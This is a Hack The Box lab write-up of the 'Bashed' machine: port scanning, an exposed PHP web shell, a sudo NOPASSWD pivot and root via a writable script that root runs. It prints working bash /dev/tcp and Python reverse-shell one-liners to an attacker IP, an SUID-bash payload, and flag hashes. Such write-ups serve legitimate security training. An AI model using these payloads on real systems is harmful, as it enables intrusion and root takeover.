
# HTB - Bashed

## Machine Information

| Information          | Details                                            |
| -------------------- | -------------------------------------------------- |
| Machine              | Bashed                                             |
| IP Address           | `10.129.59.97`                                     |
| Attacker IP          | `10.10.15.194`                                     |
| Operating System     | Ubuntu Linux                                       |
| Main Service         | HTTP                                               |
| Initial Access       | Exposed PHP web shell                              |
| Privilege Escalation | Sudo misconfiguration / Cron-like Python execution |
| Difficulty           | Easy                                               |

# 1. Reconnaissance

The target machine was assigned the following IP address:

```text
10.129.59.97
```

As usual, I started with a full TCP port scan:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.129.59.97 -oG Allports
```

The scan revealed only one open port:

```text
80/tcp open http
```

Having only port 80 exposed was somewhat unusual, but it meant that the web server would be the main attack surface.

I then performed a more detailed scan against the discovered port:

```bash
nmap -sCV -p80 10.129.59.97 -oN Targeted
```

The scan identified an Ubuntu system and the hostname:

```text
bashed
```

# 2. Web Enumeration

I opened the web server in Firefox and began enumerating the available directories.

Since the server was running PHP, I used Gobuster to discover hidden files and directories.

During the enumeration, I discovered:

```text
/dev/phpbash.php
```

The file was particularly interesting because accessing it directly provided a browser-based Bash shell.

The shell itself was useful for confirming that command execution was possible, but it was not a particularly comfortable environment.

I therefore decided to obtain a proper reverse shell.

# 3. Initial Access

I used a Bash reverse shell pointing back to my attacking machine:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.194/4444 0>&1'
```

When sending the payload through the web application, the `&` characters needed to be URL-encoded to prevent the web server from interpreting them incorrectly.

I then started a listener on my machine:

```bash
nc -lvnp 4444
```

After executing the payload, I received a shell:

```text
www-data@bashed:/home/arrexel$
```

This gave me command execution as:

```text
www-data
```

# 4. User Flag

After obtaining the shell, I checked the user's home directory:

```bash
ls
```

The directory contained:

```text
user.txt
```

I read the flag:

```bash
cat user.txt
```

The user flag was:

```text
4d104975e37d87a1581b166b04df6a80
```

At this point, I had successfully obtained the user-level access.

# 5. Privilege Escalation Enumeration

I first checked my current privileges:

```bash
id
```

The result was:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

I then checked the available sudo permissions:

```bash
sudo -l
```

The output was:

```text
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

This was immediately interesting.

The `www-data` user could execute commands as `scriptmanager` without providing a password.

Therefore, I switched to the `scriptmanager` account:

```bash
sudo -u scriptmanager -i
```

I confirmed the new identity:

```bash
whoami
```

The result:

```text
scriptmanager
```

# 6. Discovering the Writable Scripts Directory

Once inside the `scriptmanager` account, I enumerated the root directory:

```bash
ls -l /
```

Among the directories, one immediately stood out:

```text
drwxrwxr--   2 scriptmanager scriptmanager 4096 Jun  2  2022 scripts
```

The directory was:

```text
/scripts
```

and was owned by:

```text
scriptmanager:scriptmanager
```

This meant that the `scriptmanager` account had write access to it.

I entered the directory:

```bash
cd /scripts
```

and found files including:

```text
test.txt
test.py
```

The important file was:

```text
test.py
```

At this point, I needed to determine whether anything privileged was executing Python scripts from this directory.

# 7. Discovering the Root Python Execution

Using process monitoring tools such as PSpy, or by examining scheduled tasks, I discovered that scripts in `/scripts` were being executed by `root`.

This was the critical vulnerability.

We had:

```text
Root executes Python scripts
        +
scriptmanager can modify the Python script
        =
Arbitrary code execution as root
```

Because I could modify `test.py`, I could replace its contents with a Python reverse shell.

# 8. Privilege Escalation via Python Reverse Shell

I replaced the contents of `test.py` with a Python reverse shell:

```bash
echo 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.15.194",4440));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > /scripts/test.py
```

Before waiting for the script to execute, I started a listener:

```bash
nc -lvnp 4440
```

After the root process executed the Python script, the listener received a connection:

```text
Listening on 0.0.0.0 4440
Connection received on 10.129.59.100 46548
/bin/sh: 0: can't access tty; job control turned off
#
```

I checked my privileges:

```bash
whoami
```

The result was:

```text
root
```

I had successfully escalated from:

```text
www-data
```

to:

```text
scriptmanager
```

and finally to:

```text
root
```

# 9. Root Flag

With root access, I read the root flag:

```bash
cat /root/root.txt
```

The flag was:

```text
a1c0aa4d9f9c963270089ef6557c604d
```

# 10. Alternative Privilege Escalation — SUID Bash

There was another way to exploit the same vulnerable Python execution mechanism.

Instead of creating a reverse shell, I could modify `test.py` so that the root process gives `/bin/bash` the SUID permission.

For example:

```python
import os
os.system("chmod u+s /bin/bash")
```

I saved this code in:

```text
/scripts/test.py
```

Then I monitored the permissions of Bash:

```bash
watch -n1 ls -l /bin/bash
```

Because the Python script was periodically executed by root, eventually the permissions of `/bin/bash` changed.

The important part was the appearance of the SUID bit:

```text
-rwsr-xr-x
```

The `s` indicated that the SUID permission had been successfully applied.

I could then execute:

```bash
bash -p
```

The `-p` option preserves the effective privileges of the SUID binary.

Finally:

```bash
whoami
```

returned:

```text
root
```

This provided another route to a root shell without needing a reverse shell.

# Attack Path

```text
Nmap
    |
    v
TCP/80 HTTP
    |
    v
Web Enumeration
    |
    v
/dev/phpbash.php
    |
    v
PHP Bash Web Shell
    |
    v
Reverse Shell
    |
    v
www-data
    |
    v
sudo -l
    |
    v
NOPASSWD: scriptmanager
    |
    v
scriptmanager
    |
    v
/scripts
    |
    v
Writable test.py
    |
    v
Root executes Python scripts
    |
    +-------------------------+
    |                         |
    v                         v
Python Reverse Shell      SUID Bash
    |                         |
    v                         v
   root                      root
```

# Vulnerabilities & Techniques

## Exposed Web Shell

The `/dev/phpbash.php` file exposed a browser-based Bash shell.

This allowed arbitrary command execution as the web server user:

```text
www-data
```

## Reverse Shell

The web shell was used to obtain a more practical shell through a Bash reverse shell:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.194/4444 0>&1'
```

## Sudo Misconfiguration

The `www-data` user could execute commands as `scriptmanager` without authentication:

```text
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

This was exploited with:

```bash
sudo -u scriptmanager -i
```

## Writable Directory Executed by Root

The `/scripts` directory was writable by `scriptmanager`.

A Python script inside the directory was periodically executed with root privileges.

This created an obvious privilege-escalation condition:

```text
User-controlled Python code
        |
        v
Executed by root
        |
        v
Arbitrary command execution as root
```

## Python Reverse Shell

By modifying `test.py`, a reverse shell was executed when the script was run by root.

This resulted in:

```text
whoami
root
```

## SUID Bash

An alternative was to modify the Python script to execute:

```bash
chmod u+s /bin/bash
```

After the SUID bit was applied, running:

```bash
bash -p
```

provided a root shell.

# Lessons Learned

Bashed was a good example of why privilege enumeration should continue after obtaining initial access.

The initial compromise was relatively straightforward because a PHP Bash shell had accidentally been exposed in the web directory.

The more interesting part of the machine was the privilege escalation.

The chain was:

```text
Exposed PHP Shell
    |
    v
www-data
    |
    v
sudo -l
    |
    v
scriptmanager
    |
    v
Writable /scripts
    |
    v
Root executes test.py
    |
    v
Root
```

The most important lesson was recognizing the danger of a privileged process executing scripts from a directory writable by an unprivileged user.

If root executes attacker-controlled code, obtaining root privileges is generally only a matter of choosing the appropriate payload.

pwned :)))))
